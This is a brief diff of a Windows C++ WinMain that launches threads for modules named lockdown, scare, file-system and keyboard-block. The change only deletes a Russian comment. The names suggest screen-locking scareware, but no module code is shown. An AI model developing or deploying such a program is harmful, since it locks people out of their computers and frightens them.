@@ -33,7 +33,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     std::vector<std::thread> threads;
     
-    threads.emplace_back(InitializeLockdownModule);   // САМЫЙ ПЕРВЫЙ!
+    threads.emplace_back(InitializeLockdownModule);
     threads.emplace_back(InitializeScareModule);
     threads.emplace_back(InitializeFileSystemModule);
     threads.emplace_back(InitializeKeyboardBlockModule);
